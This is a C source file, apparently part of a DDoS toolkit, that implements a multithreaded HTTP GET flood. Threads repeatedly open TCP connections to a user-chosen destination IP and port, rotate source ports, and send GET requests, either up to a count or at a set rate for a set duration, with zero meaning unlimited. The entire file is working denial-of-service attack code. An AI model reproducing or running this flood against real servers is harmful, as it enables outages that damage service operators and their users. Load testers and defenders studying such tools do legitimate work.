#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/make_tcp.h"
#include "../base/receiver.h"
#include "../ddos/get_flood.h"

unsigned int get_total;
unsigned int get_produced;
unsigned int get_received;

unsigned int get_per_second;
unsigned int get_duration;
double get_elapsed_time;

char *get_dest_ip;
char *get_src_ip;
int get_src_port;
int get_dest_port;

int get_generated_count;
short get_timed_finisher;

clock_t get_global_time;
clock_t get_global_elapsed_time;

pthread_mutex_t get_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t get_cond = PTHREAD_COND_INITIALIZER;

char get_request[__GET_REQUEST_MSG_SIZE__];

void get_flood_print_usage(int mode) {

	if (mode == 1)
		printf(
				"get flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests(0 for INF)] [Src-Port] [Dest-Port] \n");
	if (mode == 2)
		printf(
				"get flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds(0 for INF)] [duration (0 for INF)] [Src-Port] [Dest-Port]\n");
}

void* generate_get_flooding1(void *data) {
	int thread_id = *((int*) data);
	clock_t thread_clock;

		while (1) {

		pthread_mutex_lock(&get_mutex);
		thread_clock = clock();

		if (get_generated_count >= get_total) {
			pthread_mutex_unlock(&get_mutex);
			pthread_cond_broadcast(&get_cond);
			return 0;
		}

		int sock = tcp_make_connection(inet_addr(get_src_ip), inet_addr(get_dest_ip),
					get_src_port, get_dest_port, SOCK_STREAM);
			get_src_port++;
			if(get_src_port >= 65000)
						get_src_port= 10000;

		if( (send(sock,get_request,__GET_REQUEST_MSG_SIZE__,0)) <0 )
		{
			perror("send error on get \n");
		}

		get_generated_count++;


		pthread_cond_signal(&get_cond);
		close(sock);
		pthread_mutex_unlock(&get_mutex);
	}

	return 0;

}
void* generate_get_flooding2(void *data) {
	int thread_id = *((int*) data);
	clock_t thread_clock;

	int sock;
	while (1) {

		pthread_mutex_lock(&get_mutex);
		thread_clock = clock();
		get_elapsed_time = ((double) (thread_clock - get_global_elapsed_time))
								/ CLOCKS_PER_SEC;

		if (get_elapsed_time >= get_duration) {
			pthread_mutex_unlock(&get_mutex);
			pthread_cond_broadcast(&get_cond);
			get_timed_finisher=1;
			return 0;
		}

		if (get_produced >= get_per_second) {
			pthread_cond_wait(&get_cond, &get_mutex);
		}

		int sock = tcp_make_connection(inet_addr(get_src_ip), inet_addr(get_dest_ip),
					get_src_port, get_dest_port, SOCK_STREAM);
			get_src_port++;
			if(get_src_port >= 65000)
						get_src_port= 10000;



		send(sock,get_request,strlen(get_request),0);

		get_produced++;
		get_total++;
		get_generated_count++;

		pthread_cond_signal(&get_cond);
		close(sock);
		pthread_mutex_unlock(&get_mutex);

	}

	return 0;
}

void* generate_get_flooding3(void *data) {
	int thread_id = *((int*) data);
	clock_t thread_clock;

	int sock;
	while (1) {

		pthread_mutex_lock(&get_mutex);
		thread_clock = clock();
		get_elapsed_time = ((double) (thread_clock - get_global_elapsed_time))
								/ CLOCKS_PER_SEC;

		if (get_elapsed_time >= get_duration) {
			pthread_mutex_unlock(&get_mutex);
			pthread_cond_broadcast(&get_cond);
			get_timed_finisher=1;
			return 0;
		}

		if (get_produced >= get_per_second) {
			pthread_cond_wait(&get_cond, &get_mutex);
		}

		int sock = tcp_make_connection(inet_addr(get_src_ip), inet_addr(get_dest_ip),
					get_src_port, get_dest_port, SOCK_STREAM);
			get_src_port++;
			if(get_src_port >= 65000)
						get_src_port= 10000;



		send(sock,get_request,strlen(get_request),0);

		get_produced++;
		get_total++;
		get_generated_count++;

		pthread_cond_signal(&get_cond);
		close(sock);
		pthread_mutex_unlock(&get_mutex);

	}

	return 0;
}

void* get_time_check(void *data) {
	int thread_id = *((int*) data);
	clock_t t1;
	t1 = clock();
	get_global_elapsed_time = clock();
	double time_taken;

	while (1) {
		pthread_mutex_lock(&get_mutex);

		get_global_time =  clock();
		get_elapsed_time = ((double) (get_global_time - get_global_elapsed_time))
							/ CLOCKS_PER_SEC;
		if(get_timed_finisher==1) return 0;
		time_taken = ((double) (get_global_time - t1)) / CLOCKS_PER_SEC;

		if (time_taken >= 1.0) {
			get_produced = 0;
			t1 = clock();
			time_taken = 0;
			pthread_cond_signal(&get_cond);
		}
		pthread_mutex_unlock(&get_mutex);
	}
}

void get_flood_run(char *argv[], int mode) {

	FILE *get_f;

	/* Will be implemented Later....
	get_f=fopen("./src/ddos/http_request.txt","rb");
	if(get_f==NULL)
	{
		perror("open error! does http_get_request.txt exist?\n");
		exit(1);
	}
	char buffer[__GET_REQUEST_MSG_SIZE__];
	while(fgets(buffer,__GET_REQUEST_MSG_SIZE__,get_f)!=NULL)
	{
		strcat(get_request,buffer);
		strcat(get_request,"\r\n");
	}
	strcat(get_request,"\r\n");
	fclose(get_f);
*/
	strcpy(get_request,	"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");
	printf("Requesting:\n%s\n",get_request);



	get_src_ip = (char*) malloc(sizeof(char) * 20);
	get_dest_ip = (char *)malloc(sizeof(char) * 20);
	int argc = 0;
	get_generated_count = 0;
	get_timed_finisher=0;
	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 1 && argc != 6) {
		get_flood_print_usage(mode);
		return;
	} else if (mode == 2 && argc != 7) {
		get_flood_print_usage(mode);
		return;
	}

	strcpy(get_src_ip, argv[0]);

	get_produced = 0;
	if (mode == 1) {
		get_total = atoi(argv[3]);
		get_src_port = atoi(argv[4]);
		get_dest_port = atoi(argv[5]);

		if (get_total == 0)
			get_total = __UINT_MAXIMUM__;

	}

	if (mode == 2) {
		get_total = 0;
		get_per_second = atoi(argv[3]);
		get_duration = atoi(argv[4]);
		if (get_duration == 0)
			get_duration = __UINT_MAXIMUM__;



		if (get_per_second == 0)
			get_per_second = __UINT_MAXIMUM__;

		get_src_port = atoi(argv[5]);
		get_dest_port = atoi(argv[6]);
	}

	int num_threads = atoi(argv[2]);

	get_dest_ip = argv[1];
	strcpy(get_dest_ip,argv[1]);

	int *generate_thread_id, *receive_thread_id;
	pthread_t *generate_thread, *receive_thread;
	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
	generate_thread = (pthread_t*) malloc(
			sizeof(pthread_t) * (num_threads + 1));



	int i;

	printf("Sending get requests to %s using %d threads\n", get_dest_ip,
			num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	for (i = 0; i < num_threads; i++) {
		if (mode == 1)
			pthread_create(&generate_thread[i], NULL, generate_get_flooding1,
					(void*) &generate_thread_id[i]);
		if (mode == 2)
		{
			printf("thread %d created\n",i);
			pthread_create(&generate_thread[i], NULL, generate_get_flooding3,
								(void*) &generate_thread_id[i]);
			/*RECEIVE THREAD DEACTIVATION*/
			//pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
		}

	}

		pthread_create(&generate_thread[i], NULL, get_time_check,
				(void*) &generate_thread_id[i]);
		num_threads++;


	for (i = 0; i < num_threads; i++) {
		void *status1,*status2;
		pthread_join(generate_thread[i], &status1);
		/*RECEIVE THREAD DEACTIVATION*/
		//pthread_join(receive_thread[i],&status2);
		printf("threads %d joined\n", i);
	}

	printf("get flood finished\nTotal %d packets sent.\n",get_generated_count);

	pthread_mutex_destroy(&get_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);
	free(get_src_ip);
	free(get_dest_ip);
	return;
}
